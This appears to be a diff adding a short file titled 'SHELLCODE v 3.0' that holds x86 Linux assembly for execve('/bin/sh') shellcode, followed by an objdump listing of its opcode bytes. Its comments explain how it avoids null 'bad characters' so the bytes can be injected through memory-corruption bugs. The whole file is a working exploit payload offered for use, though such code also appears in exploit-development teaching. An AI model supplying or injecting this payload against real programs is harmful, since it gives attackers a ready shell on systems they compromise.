@@ -1,0 +1,53 @@
+#####################################
+#   SHELLCODE v 3.0                 #
+#        BY                         #
+#      ANIR08                       #
+#                                   #
+#                                   #
+#####################################
+
+
+section .text
+             global _start
+_start:
+
+xor    eax,eax
+xor    ebx,ebx        ;clearing all registers                                                                                                                                          
+xor    ecx,ecx                                                                                                                                                                                     
+xor    edx,edx                                                                                                                                                                                     
+push   eax                                                                                                                                                                                         
+push   0x68732f2f     ;hs//                                                                                                                                                                                  
+push   0x6e69622f     ;nib/     ;/bin/sh// (written reversibly)                                                                                                                                                                        
+mov    ebx,esp        ; ebx holds the pointer to /bin/sh                                                                                                                                                                             
+mov    ecx,eax        ; ecx holds contents of second param of execve = NULL                                                                                                                                                                             
+mov    edx,eax        ; edx holds contents of third param of execve = envp[] set to NULL                                                                                                                                                                             
+mov    al,0xb         ; system call to execve() -- 0xb=11                                                                                                          
+int    0x80           ; trap kernel                                                                                                                                          
+ 
+mov    al,0x1         ; exit safely al used to avoid bad characters                                                                                                                                                                
+xor    bl,bl          ; mov bl,0 not used to avoid bad characters                                                                                                                                
+int    0x80           ; trap kernel
+
+
+
+OBJDUMP OF .TEXT WITH OPCODES:
+
+
+8049000:       31 c0                   xor    eax,eax
+8049002:       31 db                   xor    ebx,ebx
+8049004:       31 c9                   xor    ecx,ecx
+8049006:       31 d2                   xor    edx,edx
+8049008:       50                      push   eax
+8049009:       68 2f 2f 73 68          push   0x68732f2f
+804900e:       68 2f 62 69 6e          push   0x6e69622f
+8049013:       89 e3                   mov    ebx,esp
+8049015:       89 c1                   mov    ecx,eax
+8049017:       89 c2                   mov    edx,eax
+8049019:       b0 0b                   mov    al,0xb
+804901b:       cd 80                   int    0x80
+804901d:       b0 01                   mov    al,0x1
+804901f:       30 db                   xor    bl,bl
+8049021:       cd 80                   int    0x80
+
+
+
